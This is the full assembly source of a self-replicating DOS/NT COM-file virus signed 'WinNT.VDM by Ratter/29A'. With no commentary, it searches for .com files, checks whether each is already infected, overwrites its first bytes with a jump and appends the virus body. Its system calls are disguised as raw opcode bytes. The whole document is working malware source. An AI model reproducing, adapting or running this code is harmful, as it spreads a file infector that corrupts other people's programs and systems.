
BLOODvirus      segment
assume          cs:BLOODvirus
     org 100h

Start:
      db        0e9h
      dw        0
duh:
     call next
next:
     pop bx
     sub bx,offset next
     lea si, [bx + offset stuff]
     mov di, 100h
     push di
     movsw
     movsb
     lea ax, [bx + offset dta]
     call set_dta
     lea dx, [bx + masker]
     xor cx,cx
tryanother:
     lea ax, [bx + offset dta + 4]
     mov word ptr ds:[bx + offset dta], ax
     mov word ptr ds:[bx + offset dta + 2], ds
     push bx 
     db 0c4h, 0c4h
     db 50h, 9
     pop bx
     jc quit

     push bx
     lea si, [bx + offset dta + 1eh + 4]
     xor ax, ax
     mov bl, 02h
     db 0c4h, 0c4h
     db 50h, 12h
     ; in ax:bp - handle
     xchg di, ax
     pop bx

     mov ax, di
     lea dx, [bx + stuff]
     mov cx, 3
     push bx
     xor bx, bx	; set the ZF flag
     db 0c4h, 0c4h
     db 50h, 16h
     pop bx

     mov ax, word ptr cs:[bx + dta + 1ah + 4]
     mov cx, word ptr cs:[bx + stuff + 1]
     add cx, eov - duh + 3
     cmp ax,cx
     jz close
     sub ax,3
     mov word ptr cs:[bx + writebuffer], ax
     xor al,al
     call f_ptr

     push bx
     mov ax, di
     lea dx, [bx + e9]
     mov cx, 3
     xor bx, bx	; set the ZF flag
     db 0c4h, 0c4h
     db 50h, 1eh
     pop bx

     mov al, 2
     call f_ptr

     push bx
     mov ax, di
     lea dx, [bx + duh]
     mov cx, eov - duh
     xor bx, bx	; set the ZF flag
     db 0c4h, 0c4h
     db 50h, 1eh
     pop bx

close:
     push bx
     mov ax, di
     db 0c4h, 0c4h
     db 50h, 02h
     pop bx
quit:
     mov ax, 80h
set_dta:
     db	0c4h, 0c4h
     db	50h, 1bh
     retn
f_ptr:
     push bx
     push ax
     mov ax, di
     xor cx,cx
     cwd
     pop bx
     db 0c4h, 0c4h
     db 50h, 0
     pop bx
     retn

	 db	0, "WinNT.VDM by Ratter/29A", 0
masker   db     '*.com',0
stuff    db     0cdh,20h,0
e9       db     0e9h
eov      equ    $
writebuffer     dw      ?
dta             db      46 dup (?)
BLOODvirus      ends
                end start
